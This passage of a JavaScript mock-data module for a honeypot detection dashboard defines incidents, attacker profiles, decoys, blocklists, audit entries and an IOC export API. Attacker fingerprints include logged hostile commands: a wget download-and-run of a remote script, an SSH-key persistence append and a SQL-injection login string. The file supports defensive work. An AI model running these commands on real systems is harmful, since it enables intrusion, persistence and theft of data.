      why_it_matters:
        "Credential reuse of leaked data plus a persistence attempt indicates a human operator, and the same IP triggered a critical honeytoken incident two days ago.",
      recommended_actions: [
        "Keep 91.240.118.7 blocked (previous block expired).",
        "Search real hosts for the leaked deploy credential.",
        "Review auth logs for deploy@ on production.",
      ],
      is_fallback: false,
    },
    detections: [
      D("R01", 5, "Touched a decoy: GET /.env", [["T1595", 0.7]], "recon", null, ["ev_02_01"]),
      D("R02", 5, "Swept 2 bait paths in 7 s", [["T1595.003", 0.8]], "recon", null, [
        "ev_02_01",
        "ev_02_02",
      ]),
      D(
        "R06",
        25,
        "Logged in as deploy with the credential leaked via the /.env bait",
        [["T1078", 0.8]],
        "initial_access",
        null,
        ["ev_02_03"],
      ),
      D("R07", 5, "Interactive session with 3+ commands", [["T1059.004", 0.9]], "execution", null, [
        "ev_02_04",
        "ev_02_05",
        "ev_02_06",
      ]),
      D(
        "R08",
        10,
        "Discovery commands: id, ls -la ~",
        [
          ["T1033", 0.8],
          ["T1083", 0.8],
        ],
        "discovery",
        null,
        ["ev_02_04", "ev_02_05"],
      ),
      D(
        "R10",
        20,
        "Persistence: appended an attacker key to ~/.ssh/authorized_keys",
        [["T1098.004", 0.8]],
        "execution",
        null,
        ["ev_02_06"],
      ),
      D("R11", 10, "Read decoy data: customer_data.csv", [["T1005", 0.8]], "collection", null, [
        "ev_02_07",
      ]),
    ],
  },
  {
    id: "inc_01",
    number: 1,
    title: "Honeytoken key used against the real Customers API",
    status: "resolved",
    label: "targeted",
    severity: "critical",
    score: 75,
    src_ip: "91.240.118.7",
    attacker_id: "att_3",
    real_asset_reached: true,
    honeytoken_used: true,
    ai_status: "ready",
    stages: ["recon", "collection", "exfiltration"],
    ai_summary: {
      headline: "Admin-panel export led directly to honeytoken use on the real API",
      what_happened:
        "The source hit the admin decoy, exported the fake customer list from the unauthenticated export endpoint, and six minutes later presented a honeytoken key (acme_live_…b1) to the real /api/customers endpoint.",
      why_it_matters: "Zero false-positive signal: the key only ever existed in the decoy export.",
      recommended_actions: ["Resolved: key revoked, IP blocked for 24 h."],
      is_fallback: false,
    },
    detections: [
      D("R01", 5, "Touched a decoy: GET /admin", [["T1595", 0.7]], "recon", null, ["ev_01_01"]),
      D(
        "R11",
        10,
        "Exported decoy customer data (customers.csv)",
        [["T1005", 0.8]],
        "collection",
        null,
        ["ev_01_03"],
      ),
      D(
        "R16",
        50,
        "Honeytoken acme_live_…b1 used against /api/customers. Floor CRITICAL.",
        [
          ["T1552.001", 0.95],
          ["T1078", 0.95],
        ],
        "exfiltration",
        "critical",
        ["ev_01_04"],
      ),
    ],
  },
];

const db = {
  incidents: incidentDefs.map((d) => {
    const evs = events
      .filter((e) => e.incident_id === d.id)
      .sort((a, b) => new Date(a.occurred_at) - new Date(b.occurred_at));
    return {
      ...d,
      techniques: [...new Set(d.detections.flatMap((x) => x.techniques.map((t) => t.id)))],
      event_count: evs.reduce((n, e) => n + (e.count || 1), 0),
      first_event_at: evs[0].occurred_at,
      last_event_at: evs[evs.length - 1].occurred_at,
      ai_headline: d.ai_summary?.headline || null,
      floor: d.detections.some((x) => x.floor === "critical")
        ? "critical"
        : d.detections.some((x) => x.floor === "high")
          ? "high"
          : null,
    };
  }),
};

const summarize = (i) => {
  const { detections, ai_summary, attacker_id, ...s } = i;
  return s;
};

/* ───────────────────────── Attackers ───────────────────────── */
db.attackers = [
  {
    id: "att_1",
    entity_key: "ip:203.0.113.66",
    ip: "203.0.113.66",
    label: "targeted",
    cadence: "human",
    first_seen_at: iso(840),
    last_seen_at: iso(629),
    event_count: 17,
    session_count: 2,
    decoys_touched: ["web-admin", "web-bait", "ssh-db-backup-01"],
    fingerprints: {
      client_banner: "SSH-2.0-OpenSSH_9.6",
      user_agents: ["Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"],
      country: "NL (simulated)",
      asn: "AS64496 DOC-NET",
      credentials_tried: [
        "root / r***6",
        "root / p***d",
        "admin / a***3",
        "ubuntu / u***u",
        "test / t***4",
        "admin / a***n (accepted)",
      ],
      commands: [
        "ls -la /srv",
        "uname -a",
        "cd /srv/exports && ls",
        "cat /srv/exports/customer_data.csv",
        "cat ~/.config/acme.json",
      ],
      files: ["customer_data.csv (48 KB, decoy)", "acme.json (honeytoken)"],
    },
    real_assets_touched: ["Payments API", "Customers API"],
    incident_ids: ["inc_07"],
    techniques: [
      "T1595.003",
      "T1110.001",
      "T1078.001",
      "T1059.004",
      "T1083",
      "T1082",
      "T1005",
      "T1552.001",
      "T1078",
      "T1041",
    ],
  },
  {
    id: "att_2",
    entity_key: "ip:198.51.100.23",
    ip: "198.51.100.23",
    label: "opportunistic",
    cadence: "bot",
    first_seen_at: iso(2460),
    last_seen_at: iso(2450),
    event_count: 10,
    session_count: 1,
    decoys_touched: ["ssh-db-backup-01"],
    fingerprints: {
      client_banner: "SSH-2.0-Go",
      user_agents: [],
      country: "US (simulated)",
      asn: "AS64497 TEST-NET-2",
      credentials_tried: [
        "root / r***t",
        "root / 1***6",
        "pi / r***y",
        "admin / 1***4",
        "root / t***r",
        "root / a***3 (accepted)",
      ],
      commands: [
        "uname -s -v -n -r -m",
        "cd /tmp || cd /var/run; wget http://45.9.148.21/x.sh -O .x; chmod +x .x; ./.x",
        "rm -rf .x",
      ],
      files: [],
    },
    real_assets_touched: [],
    incident_ids: ["inc_06"],
    techniques: ["T1110.001", "T1078.001", "T1082", "T1105", "T1059.004"],
  },
  {
    id: "att_3",
    entity_key: "ip:91.240.118.7",
    ip: "91.240.118.7",
    label: "targeted",
    cadence: "human",
    first_seen_at: iso(172800),
    last_seen_at: iso(17770),
    event_count: 11,
    session_count: 3,
    decoys_touched: ["web-admin", "web-bait", "ssh-db-backup-01"],
    fingerprints: {
      client_banner: "SSH-2.0-OpenSSH_8.9p1",
      user_agents: ["curl/8.5.0"],
      country: "RU (simulated)",
      asn: "AS64511 EXAMPLE-HOST",
      credentials_tried: ["admin / a***n (accepted)", "deploy / S***4 (accepted, leaked)"],
      commands: [
        "id",
        "ls -la ~",
        'echo "ssh-ed25519 AAAAC3Nza… op@kali" >> ~/.ssh/authorized_keys',
        "cat /srv/exports/customer_data.csv",
      ],
      files: ["customers.csv (decoy export)", "customer_data.csv (decoy)"],
    },
    real_assets_touched: ["Customers API"],
    incident_ids: ["inc_02", "inc_01"],
    techniques: [
      "T1595.003",
      "T1078.001",
      "T1078",
      "T1005",
      "T1552.001",
      "T1041",
      "T1098.004",
      "T1033",
      "T1083",
    ],
  },
  {
    id: "att_4",
    entity_key: "ip:192.0.2.88",
    ip: "192.0.2.88",
    label: "opportunistic",
    cadence: "bot",
    first_seen_at: iso(10800),
    last_seen_at: iso(10040),
    event_count: 13,
    session_count: 2,
    decoys_touched: ["web-admin", "web-bait"],
    fingerprints: {
      client_banner: null,
      user_agents: ["sqlmap/1.7.11#stable (https://sqlmap.org)"],
      country: "DE (simulated)",
      asn: "AS64500 TEST-NET-3",
      credentials_tried: ["admin' OR '1'='1'-- / x"],
      commands: [],
      files: [],
    },
    real_assets_touched: [],
    incident_ids: ["inc_05"],
    techniques: ["T1595.002", "T1595.003", "T1190", "T1110.001"],
  },
  {
    id: "att_5",
    entity_key: "ip:45.155.205.233",
    ip: "45.155.205.233",
    label: "noise",
    cadence: "bot",
    first_seen_at: iso(7500),
    last_seen_at: iso(3282),
    event_count: 14,
    session_count: 2,
    decoys_touched: ["web-bait", "ssh-db-backup-01"],
    fingerprints: {
      client_banner: "SSH-2.0-libssh_0.9.6",
      user_agents: ["Mozilla/5.0 zgrab/0.x"],
      country: "NL (simulated)",
      asn: "AS64502 SCAN-NET",
      credentials_tried: ["admin / p***d (x6)"],
      commands: [],
      files: [],
    },
    real_assets_touched: [],
    incident_ids: ["inc_04", "inc_03"],
    techniques: ["T1595", "T1595.003", "T1110.001"],
  },
];

/* ───────────────────────── Decoys & containment ───────────────────────── */
db.decoys = [
  {
    id: "web-admin",
    name: "Admin portal",
    type: "web",
    persona: "Acme Admin Console (/admin)",
    service: "http:/admin",
    status: "online",
    last_event_at: iso(310),
    last_heartbeat_at: iso(8),
    events_24h: 4120,
    agent_version: "0.4.2",
    policy_version: 44,
  },
  {
    id: "web-bait",
    name: "Bait files",
    type: "web",
    persona: "/.env /backup.sql /.git/config /wp-login.php",
    service: "http:/*",
    status: "online",
    last_event_at: iso(120),
    last_heartbeat_at: iso(8),
    events_24h: 9873,
    agent_version: "0.4.2",
    policy_version: 44,
  },
  {
    id: "ssh-db-backup-01",
    name: "SSH backup server",
    type: "ssh",
    persona: "db-backup-01 (Ubuntu 22.04, Cowrie)",
    service: "ssh:22",
    status: "online",
    last_event_at: iso(629),
    last_heartbeat_at: iso(11),
    events_24h: 3912,
    agent_version: "0.4.2",
    policy_version: 44,
  },
  {
    id: "redis-cache-01",
    name: "Redis cache",
    type: "redis",
    persona: "cache-01 (Redis 7.0, weak password)",
    service: "redis:6379",
    status: "stale",
    last_event_at: iso(1495),
    last_heartbeat_at: iso(263),
    events_24h: 537,
    agent_version: "0.4.1",
    policy_version: 43,
  },
];

const posture = {
  network_mode: "decoy-net (internal, no egress)",
  read_only: true,
  cap_drop: "ALL",
  user: "10001:10001 (non-root)",
  mem_limit: "256 MiB",
  pids_limit: 128,
  no_new_privileges: true,
};
const checks = (n = 10) =>
  [
    ["Egress to the internet is blocked", "curl 1.1.1.1:443 -> connection refused"],
    ["DNS resolution is blocked", "getent hosts example.com -> not found"],
    ["No route to the production network", "ping 10.0.0.1 -> unreachable"],
    ["Root filesystem is read-only", "touch /probe -> read-only file system"],
    ["All Linux capabilities dropped", "CapEff = 0000000000000000"],
    ["Process runs as a non-root user", "uid=10001"],
    ["No privileged mode / no host PID namespace", "HostConfig.Privileged = false"],
    ["Docker socket not mounted", "/var/run/docker.sock absent"],
    ["No host bind mounts (except read-only bait)", "mounts: /bait:ro"],
    ["Memory and PID limits enforced", "memory=268435456 pids=128"],
  ]
    .slice(0, n)
    .map(([name, detail]) => ({ name, status: "pass", detail }));
db.containment = {
  last_run_at: iso(1240),
  passed: 10,
  total: 10,
  status: "pass",
  command: "npx lxs selftest --project acme-shop --report",
  containers: db.decoys.map((d) => ({
    decoy_id: d.id,
    container: `ds-${d.id}`,
    declared: { ...posture },
    selftest: {
      status: "pass",
      run_at: iso(d.id === "redis-cache-01" ? 3600 : 1240),
      checks: checks(),
    },
  })),
};

/* ───────────────────────── Blocklist, audit, settings, system ───────────────────────── */
db.blocklist = [
  {
    id: "blk_4",
    ip: "198.51.100.23",
    reason: "Scripted SSH bot, payload host 45.9.148.21",
    incident_id: "inc_06",
    incident_number: 6,
    created_by: "maya@acme.example",
    created_at: iso(2100),
    expires_at: iso(-84300),
    status: "applied",
    applied_sensors: 3,
    total_sensors: 3,
  },
  {
    id: "blk_3",
    ip: "45.155.205.0/24",
    reason: "Mass scanner range, manual add",
    incident_id: null,
    incident_number: null,
    created_by: "ravi@acme.example",
    created_at: iso(86400 * 3),
    expires_at: iso(-86400 * 27),
    status: "applied",
    applied_sensors: 3,
    total_sensors: 3,
  },
  {
    id: "blk_2",
    ip: "185.220.101.4",
    reason: "Tor exit probing /api/payments",
    incident_id: null,
    incident_number: null,
    created_by: "maya@acme.example",
    created_at: iso(86400 * 2),
    expires_at: iso(-86400 * 5),
    status: "applied",
    applied_sensors: 3,
    total_sensors: 3,
  },
  {
    id: "blk_1",
    ip: "91.240.118.7",
    reason: "Honeytoken used against Customers API",
    incident_id: "inc_01",
    incident_number: 1,
    created_by: "maya@acme.example",
    created_at: iso(172000),
    expires_at: iso(172000 - 86400),
    status: "expired",
    applied_sensors: 3,
    total_sensors: 3,
  },
];

db.audit = [
  {
    id: "aud_12",
    at: iso(2100),
    actor: "maya@acme.example",
    action: "block_ip",
    target: "198.51.100.23 (inc #6)",
    metadata: { duration_hours: 24, policy_version: 44 },
    ip: "10.8.0.14",
  },
  {
    id: "aud_11",
    at: iso(2380),
    actor: "maya@acme.example",
    action: "incident.acknowledge",
    target: "incident #2",
    metadata: { from: "open", to: "acknowledged" },
    ip: "10.8.0.14",
  },
  {
    id: "aud_10",
    at: iso(9800),
    actor: "maya@acme.example",
    action: "incident.acknowledge",
    target: "incident #5",
    metadata: { from: "open", to: "acknowledged" },
    ip: "10.8.0.14",
  },
  {
    id: "aud_9",
    at: iso(14200),
    actor: "ravi@acme.example",
    action: "incident.resolve",
    target: "incident #3",
    metadata: { from: "open", to: "resolved", note: "scanner" },
    ip: "10.8.0.22",
  },
  {
    id: "aud_8",
    at: iso(20000),
    actor: "system",
    action: "notification.sent",
    target: "slack #soc-alerts",
    metadata: { incident: 2, severity: "high" },
    ip: null,
  },
  {
    id: "aud_7",
    at: iso(86400 * 1),
    actor: "ravi@acme.example",
    action: "settings.update",
    target: "retention_days",
    metadata: { from: 14, to: 30 },
    ip: "10.8.0.22",
  },
  {
    id: "aud_6",
    at: iso(86400 * 2 - 600),
    actor: "maya@acme.example",
    action: "block_ip",
    target: "185.220.101.4",
    metadata: { duration_hours: 168, manual: true },
    ip: "10.8.0.14",
  },
  {
    id: "aud_5",
    at: iso(172500),
    actor: "maya@acme.example",
    action: "incident.resolve",
    target: "incident #1",
    metadata: { from: "acknowledged", to: "resolved", note: "honeytoken key revoked" },
    ip: "10.8.0.14",
  },
  {
    id: "aud_4",
    at: iso(172700),
    actor: "maya@acme.example",
    action: "export_iocs",
    target: "incident #1",
    metadata: { format: "stix" },
    ip: "10.8.0.14",
  },
  {
    id: "aud_3",
    at: iso(172900),
    actor: "maya@acme.example",
    action: "block_ip",
    target: "91.240.118.7 (inc #1)",
    metadata: { duration_hours: 24, policy_version: 41 },
    ip: "10.8.0.14",
  },
  {
    id: "aud_2",
    at: iso(86400 * 6),
    actor: "ravi@acme.example",
    action: "key.create",
    target: "ds_live_9fK2…",
    metadata: { name: "prod-sensors" },
    ip: "10.8.0.22",
  },
  {
    id: "aud_1",
    at: iso(86400 * 6 + 120),
    actor: "ravi@acme.example",
    action: "project.create",
    target: "Acme Shop",
    metadata: {},
    ip: "10.8.0.22",
  },
];

db.settings = {
  project: { id: PROJECT_ID, name: PROJECT_NAME },
  keys: [
    {
      id: "key_2",
      name: "prod-sensors",
      prefix: "ds_live_9fK2",
      created_at: iso(86400 * 6),
      last_used_at: iso(8),
      scopes: ["ingest"],
    },
    {
      id: "key_1",
      name: "ci-selftest",
      prefix: "ds_live_Q71x",
      created_at: iso(86400 * 9),
      last_used_at: iso(3600 * 5),
      scopes: ["ingest"],
    },
  ],
  channels: [
    {
      id: "ch_1",
      type: "slack",
      label: "#soc-alerts",
      target: "https://hooks.slack.com/services/T0…/B0…/•••",
      status: "ok",
      min_severity: "high",
    },
    {
      id: "ch_2",
      type: "webhook",
      label: "PagerDuty bridge",
      target: "https://events.example.com/lxs/•••",
      status: "ok",
      min_severity: "critical",
    },
  ],
  allowlist: ["10.0.0.0/8", "192.168.0.0/16", "203.0.113.200/32"],
  retention_days: 30,
  ai_narration: true,
  credential_capture: "masked",
};

const series = (base, amp, seed) =>
  Array.from({ length: 24 }, (_, i) =>
    Math.max(
      0,
      Math.round(base + amp * Math.sin((i + seed) / 2.6) + ((i * 37 + seed * 11) % 7) * (amp / 7)),
    ),
  );
db.system = {
  version: "0.4.2",
  uptime_seconds: 86400 * 4 + 3600 * 7,
  ingest_rate_per_min: 412,
  queue_depth: 3,
  stream_connections: 2,
  events_24h: 18442,
  failed_jobs: [
    {
      id: "job_91",
      name: "narrate-incident",
      error: "LLM timeout after 8000 ms (incident #4); template fallback used",
      failed_at: iso(3100),
      attempts: 3,
    },
    {
      id: "job_77",
      name: "notify-incident",
      error: "Webhook 502 Bad Gateway (PagerDuty bridge)",
      failed_at: iso(21000),
      attempts: 5,
    },
  ],
  llm: {
    model: "claude-sonnet-5-5",
    success_rate: 0.964,
    p50_ms: 1840,
    p95_ms: 4120,
    calls_24h: 28,
    fallbacks_24h: 3,
  },
  agents: [
    {
      id: "agent-web-01",
      host: "edge-web-01",
      version: "0.4.2",
      latest: "0.4.2",
      outdated: false,
      last_heartbeat_at: iso(8),
      buffer: 0,
      dropped: 0,
    },
    {
      id: "agent-ssh-01",
      host: "edge-ssh-01",
      version: "0.4.2",
      latest: "0.4.2",
      outdated: false,
      last_heartbeat_at: iso(11),
      buffer: 2,
      dropped: 0,
    },
    {
      id: "agent-redis-01",
      host: "edge-redis-01",
      version: "0.4.1",
      latest: "0.4.2",
      outdated: true,
      last_heartbeat_at: iso(263),
      buffer: 41,
      dropped: 0,
    },
  ],
  ingest_series: series(300, 120, 3).map((v, i) => ({
    hour: `${String((new Date(NOW).getHours() - 23 + i + 24) % 24).padStart(2, "0")}:00`,
    events: v * 4,
  })),
};

db.onboarding = {
  steps: [
    { key: "project", done: true, label: "Create project", detail: "Acme Shop (prj_acme_shop)" },
    { key: "key", done: true, label: "Create ingest key", detail: "ds_live_9fK2…" },
    {
      key: "sdk",
      done: true,
      label: "Install the SDK and middleware",
      detail: "First sdk heartbeat 6 days ago",
    },
    { key: "decoys", done: true, label: "Start the decoys", detail: "4 decoys registered" },
    { key: "sensor", done: true, label: "Sensor online", detail: "3 of 4 sensors heartbeating" },
    {
      key: "event",
      done: true,
      label: "First event received",
      detail: "18,442 events in the last 24 h",
    },
  ],
};

/* ───────────────────────── Overview series ───────────────────────── */
function overviewSeries() {
  const h0 = new Date(NOW).getHours();
  return Array.from({ length: 24 }, (_, i) => {
    const hr = (h0 - 23 + i + 24) % 24;
    const noise = 40 + Math.round(34 * Math.abs(Math.sin((i + 2) / 3.1)) + ((i * 13) % 11));
    const opportunistic = Math.round(4 + 5 * Math.abs(Math.sin(i / 2.2)) + ((i * 7) % 4));
    const targeted =
      i === 23 ? 17 : i === 22 ? 3 : i === 18 ? 9 : i === 4 ? 6 : (i * 5) % 3 === 0 ? 1 : 0;
    return { hour: `${String(hr).padStart(2, "0")}:00`, noise, opportunistic, targeted };
  });
}

/* ───────────────────────── Live-feed simulator ───────────────────────── */
const livePool = [
  ["http.request", "http:/.env", "web-bait", { method: "GET", url: "/.env", status_code: 200 }],
  ["http.request", "http:/admin", "web-admin", { method: "GET", url: "/admin", status_code: 302 }],
  [
    "http.request",
    "http:/wp-login.php",
    "web-bait",
    { method: "GET", url: "/wp-login.php", status_code: 404 },
  ],
  ["auth.attempt", "ssh:22", "ssh-db-backup-01", { username: "root", password_masked: "r***t" }],
  ["connection.open", "ssh:22", "ssh-db-backup-01", { client_banner: "SSH-2.0-libssh_0.9.6" }],
  ["db.command", "redis:6379", "redis-cache-01", { command: "INFO" }],
  [
    "http.request",
    "http:/.git/config",
    "web-bait",
    { method: "GET", url: "/.git/config", status_code: 404 },
  ],
  [
    "http.request",
    "http:/phpmyadmin/",
    "web-bait",
    { method: "GET", url: "/phpmyadmin/", status_code: 404 },
  ],
];
const liveIps = [
  "45.155.205.233",
  "185.191.171.4",
  "94.102.61.8",
  "141.98.11.20",
  "5.188.206.14",
  "162.142.125.19",
  "89.248.165.52",
  "103.203.57.9",
];
let liveN = 0;
export function nextLiveEvent() {
  liveN += 1;
  const [type, svc, decoy, f] = livePool[(liveN * 5 + 3) % livePool.length];
  const ip = liveIps[(liveN * 3) % liveIps.length];
  const t = new Date().toISOString();
  const e = {
    id: `ev_live_${liveN}`,
    event_uid: `01JLIVE${String(liveN).padStart(17, "0")}`,
    event_type: type,
    is_decoy: true,
    src_ip: ip,
    src_port: 30000 + liveN * 17,
    dst_service: svc,
    decoy_id: decoy,
    session_id: null,
    outcome: type === "auth.attempt" ? "failure" : null,
    occurred_at: t,
    received_at: t,
    fields: f,
    count: 1,
    simulated: false,
    incident_id: liveN % 4 === 0 ? "inc_04" : null,
    stage: "recon",
    techniques: ["T1595"],
    tags: [],
    _fresh: true,
  };
  db.system.events_24h = (db.system.events_24h || 0) + 1;
  return e;
}

/* ───────────────────────── Mock API ───────────────────────── */
const openOf = (arr) => arr.filter((i) => i.status === "open" || i.status === "acknowledged");
const sevRank = { critical: 4, high: 3, medium: 2, low: 1 };

function buildOverview() {
  const open = openOf(db.incidents);
  const healthy = db.decoys.filter((d) => d.status === "online").length;
  return {
    incidents_open: db.incidents.filter((i) => i.status === "open").length,
    incidents_critical: open.filter((i) => i.severity === "critical").length,
    incidents_high: open.filter((i) => i.severity === "high").length,
    events_24h: db.system.events_24h,
    noise_suppressed_24h: 1284,
    attackers_24h: 17,
    decoys_healthy: healthy,
    decoys_total: db.decoys.length,
    mtta_seconds: 252,
    top_incidents: open
      .filter((i) => i.label === "targeted")
      .sort((a, b) => sevRank[b.severity] - sevRank[a.severity] || b.score - a.score)
      .slice(0, 5)
      .map(summarize),
    series_24h: overviewSeries(),
    llm: { ok: true, model: "claude-sonnet-5-5" },
  };
}

function applyBlockExpiry() {
  db.blocklist.forEach((b) => {
    if (b.status !== "expired" && b.expires_at && new Date(b.expires_at) < new Date())
      b.status = "expired";
  });
}

export const mock = {
  projectId: PROJECT_ID,
  overview: () => clone(buildOverview()),
  incidents: () => clone(db.incidents.map(summarize)),
  incident: (id) => {
    const i = db.incidents.find((x) => x.id === id || String(x.number) === String(id));
    if (!i) return null;
    return clone(i);
  },
  incidentEvents: (id) =>
    clone(
      events
        .filter((e) => e.incident_id === id)
        .sort((a, b) => new Date(a.occurred_at) - new Date(b.occurred_at)),
    ),
  events: () => clone(events),
  attackers: () => clone(db.attackers),
  attacker: (id) => {
    const a = db.attackers.find((x) => x.id === id);
    if (!a) return null;
    const out = clone(a);
    out.incidents = db.incidents.filter((i) => a.incident_ids.includes(i.id)).map(summarize);
    out.recent_events = clone(events.filter((e) => e.src_ip === a.ip).slice(0, 30));
    return out;
  },
  attackMatrix: () => {
    const used = new Map();
    db.incidents.forEach((i) => i.techniques.forEach((t) => used.set(t, (used.get(t) || 0) + 1)));
    return {
      range: "30d",
      tactics: TACTICS.map((tactic) => ({
        tactic,
        techniques: Object.entries(TECHNIQUES)
          .filter(([, v]) => v.tactic === tactic)
          .map(([id, v]) => ({
            id,
            name: v.name,
            count: v.count + (used.get(id) || 0) * 2,
            incidents: used.get(id) || 0,
          })),
      })),
    };
  },
  decoys: () => clone(db.decoys),
  containment: () => clone(db.containment),
  blocklist: () => {
    applyBlockExpiry();
    return clone(db.blocklist);
  },
  audit: () => clone(db.audit),
  settings: () => clone(db.settings),
  system: () => clone(db.system),
  onboarding: () => clone(db.onboarding),
  isBlocked: (ip) => {
    applyBlockExpiry();
    return db.blocklist.find((b) => b.ip === ip && b.status !== "expired") || null;
  },
  iocs: (incidentId, format = "json") => {
    const i = db.incidents.find((x) => x.id === incidentId);
    const evs = events.filter((e) => e.incident_id === incidentId);
    const first = evs.reduce(
      (m, e) => (e.occurred_at < m ? e.occurred_at : m),
      evs[0]?.occurred_at,
    );
    const last = evs.reduce((m, e) => (e.occurred_at > m ? e.occurred_at : m), evs[0]?.occurred_at);
    const indicators = [
      {
        type: "ipv4",
        value: i.src_ip,
        first_seen: first,
        last_seen: last,
        context: `${i.label}; ${i.real_asset_reached ? "reached a real asset" : "decoy activity only"}`,
      },
    ];
    evs.forEach((e) => {
      if (e.fields.command)
        indicators.push({
          type: "command",
          value: e.fields.command,
          first_seen: e.occurred_at,
          last_seen: e.occurred_at,
          context: e.stage || "activity",
        });
      if (e.fields.username && e.outcome === "success")
        indicators.push({
          type: "credential",
          value: `${e.fields.username}:${e.fields.password_clear || e.fields.password_masked}`,
          first_seen: e.occurred_at,
          last_seen: e.occurred_at,
          context: `Accepted on ${e.decoy_id}`,
        });
      if (e.fields.token)
        indicators.push({
          type: "honeytoken",
          value: e.fields.token,
          first_seen: e.occurred_at,
          last_seen: e.occurred_at,
          context: e.event_type,
        });
    });
    return {
      generated_at: new Date().toISOString(),
      project: "acme-shop-prod",
      incident: i.number,
      indicators,
      format,
    };
  },
};
